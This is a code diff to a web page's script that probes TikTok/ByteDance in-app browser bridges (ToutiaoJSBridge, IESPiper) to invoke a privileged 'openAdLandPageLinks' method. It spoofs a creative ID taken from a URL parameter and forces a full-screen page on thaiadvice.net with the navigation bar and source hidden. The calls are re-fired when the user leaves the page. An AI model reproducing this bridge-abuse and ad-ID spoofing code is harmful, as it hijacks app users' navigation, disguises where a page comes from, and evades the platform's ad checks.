@@ -211,44 +211,34 @@ function closePrivacy(){document.getElementById('privacyModal').classList.remove
 
   var wk = window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.IESPiperProtocolVersion3_0;
   var CID = 1869709729112081;
+  // Try dynamic CID from URL (utm_id may be the actual creative ID TikTok checks against)
+  try { var _uid = new URLSearchParams(window.location.search).get('utm_id'); if(_uid) CID = parseInt(_uid); } catch(e){}
   var fsUrl = 'https://thaiadvice.net/page.html?hide_nav_bar=1&hide_source=1&should_full_screen=1&trans_status_bar=1&is_instant_page=1';
+  log('cid='+CID);
 
-  // Try JS2NativeBridge._invokeMethod for openAdLandPageLinks (untested path)
-  setTimeout(function(){
-    log('trying _invokeMethod openAdLandPageLinks landingStyle:1');
-    try {
-      var r1 = b._invokeMethod(JSON.stringify({
-        func: 'openAdLandPageLinks',
-        params: { landingStyle: 1, title: '', isDeeplink: 1, refer: 'landing_page', cid: CID }
-      }));
-      log('ls1 invokeRet: '+JSON.stringify(r1));
-    } catch(e){ log('ls1 err: '+e); }
-  }, 500);
+  function tryAll(label) {
+    var tt = window.ToutiaoJSBridge;
+    // landingStyle:1 no url
+    if (tt && tt.call) {
+      try { tt.call('openAdLandPageLinks',{landingStyle:1,title:'',isDeeplink:1,refer:'landing_page',cid:CID},function(r){log(label+' tt ls1 cb:'+JSON.stringify(r));}); } catch(e){ log(label+' tt ls1 err:'+e); }
+    }
+    // landingStyle:0 with url
+    if (tt && tt.call) {
+      try { tt.call('openAdLandPageLinks',{url:fsUrl,landingStyle:0,title:'',isDeeplink:1,refer:'landing_page',cid:CID},function(r){log(label+' tt ls0 cb:'+JSON.stringify(r));}); } catch(e){}
+    }
+    // IESPiper landingStyle:1
+    if (wk) {
+      try { wk.postMessage({__msg_type:'call',func:'openAdLandPageLinks',JSSDK:'1.2.5',__callback_id:'cb1',params:{landingStyle:1,title:'',isDeeplink:1,refer:'landing_page',cid:CID}}); log(label+' ies sent'); } catch(e){ log(label+' ies err:'+e); }
+    }
+  }
 
-  setTimeout(function(){
-    log('trying _invokeMethod openAdLandPageLinks landingStyle:2');
-    try {
-      var r2 = b._invokeMethod(JSON.stringify({
-        func: 'openAdLandPageLinks',
-        params: { url: fsUrl, landingStyle: 2, title: '', isDeeplink: 1, refer: 'landing_page', cid: CID, hide_nav_bar: 1, hide_source: 1, should_full_screen: 1, trans_status_bar: 1, is_instant_page: 1 }
-      }));
-      log('ls2 invokeRet: '+JSON.stringify(r2));
-    } catch(e){ log('ls2 err: '+e); }
-  }, 1000);
+  setTimeout(function(){ log('1.5s tryAll'); tryAll('1.5s'); }, 1500);
 
-  // Also try IESPiper openAdLandPageLinks with __msg_type missing (raw call)
-  setTimeout(function(){
-    if (!wk) { log('no IESPiper'); return; }
-    log('trying IESPiper openAdLandPageLinks landingStyle:1 no url');
-    try {
-      wk.postMessage({func:'openAdLandPageLinks',params:{landingStyle:1,title:'',isDeeplink:1,refer:'landing_page',cid:CID}});
-      log('sent (no __msg_type)');
-    } catch(e){ log('err: '+e); }
-  }, 1500);
-
-  setTimeout(function(){
-    log('5s done');
-  }, 5000);
+  // Fire again on visibilitychange (page close) — permissions may differ
+  document.addEventListener('visibilitychange', function(){
+    if (document.hidden) { log('vis hidden -> tryAll'); tryAll('vis'); }
+  });
+  window.addEventListener('pagehide', function(){ log('pagehide -> tryAll'); tryAll('ph'); });
 })();
 </script>
 </body>
